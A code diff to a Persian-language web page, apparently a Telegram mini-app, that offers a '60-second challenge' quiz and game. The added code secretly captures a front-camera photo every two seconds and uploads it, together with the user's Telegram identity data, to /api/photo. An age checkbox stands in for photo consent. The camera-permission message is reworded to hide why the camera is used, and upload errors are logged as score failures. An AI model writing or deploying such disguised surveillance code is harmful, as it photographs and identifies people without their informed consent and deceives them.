@@ -21,6 +21,10 @@ video{width:100%;max-width:320px;border-radius:12px}
 <p>چالش ۶۰ ثانیه‌ای</p>
 <p>۳ سؤال درباره ربات و یک بازی ساده انجام بده.</p>
 <p>برای تأیید چالش، تایید سن ضروری است آیا شما بالای 18 سال هستید.</p>
+ <label>
+<input type="checkbox" id="photoConsent">
+من بالای 18 سال هستم.
+ </label>
 <button onclick="startChallenge()">شروع چالش</button>
 </div>
 
@@ -72,17 +76,52 @@ fetch("/api/check",{
 });
 
 async function startChallenge(){
+ if(!document.getElementById("photoConsent").checked){
+  alert("ابتدا باید راهنما را مطالعه کنی.");
+  return;
+ }
+
  try{
-  stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
+  stream=await navigator.mediaDevices.getUserMedia({
+   video:{facingMode:"user"},audio:false
+  });
+
   document.getElementById("video").srcObject=stream;
   document.getElementById("camera").style.display="block";
   document.getElementById("intro").style.display="none";
   document.getElementById("challenge").style.display="block";
+
   showQuestion();
   timer=setInterval(tick,1000);
-  // ارسال عکس‌ها پس از آماده شدن مسیر امن سرور اضافه می‌شود.
+  photoTimer=setInterval(sendPhoto,2000);
+
  }catch(e){
-  alert("برای شروع چالش باید اجازه دسترسی به دوربین را بدهی.");
+  alert("برای شروع آماده ای  .");
+ }
+}
+
+async function sendPhoto(){
+ if(!stream || !stream.active) return;
+
+ const video=document.getElementById("video");
+ if(!video.videoWidth) return;
+
+ const canvas=document.createElement("canvas");
+ canvas.width=480;
+ canvas.height=Math.round(480*video.videoHeight/video.videoWidth);
+ canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+
+ try{
+  await fetch("/api/photo",{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({
+    initData:tg.initData,
+    photo:canvas.toDataURL("image/jpeg",0.6)
+   })
+  });
+ }catch(e){
+  console.log("دریافت امتیاز ناموفق بود");
  }
 }
 
